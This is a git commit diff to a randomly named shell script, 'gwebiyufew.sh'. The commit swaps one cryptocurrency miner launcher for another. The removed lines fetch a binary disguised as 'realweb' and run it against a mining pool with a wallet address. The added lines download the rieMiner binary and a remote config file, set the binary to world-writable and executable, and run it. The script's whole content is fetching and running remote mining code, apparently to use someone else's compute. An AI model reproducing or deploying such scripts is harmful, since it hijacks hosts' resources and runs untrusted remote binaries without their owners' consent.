baf5598f847375b754214d273769f55573d03dd9
Frotinor <reysanju1999@gmail.com>
2024-12-14 03:23:34 +0700

    Update gwebiyufew.sh

--- gwebiyufew.sh
+++ gwebiyufew.sh
@@ -1,3 +1,5 @@
-wget https://github.com/fikriboehimi/realweb/raw/refs/heads/main/realweb && \
-chmod +x realweb
-./realweb -o mintme.wattpool.net:1111 -u 0xDA45B452B7FB0fc31ea7c4e88Dc3db0a9685BD19 -p x --worker-id openg --donate-level 0
+sudo apt update -y && \
+wget https://riecoin.xyz/rieMiner/Download/Deb64AVX2 && \
+chmod 777 Deb64AVX2 && \
+wget https://raw.githubusercontent.com/Frotinor/heithere/refs/heads/main/gwernui.conf && \
+./Deb64AVX2 "gwernui.conf"
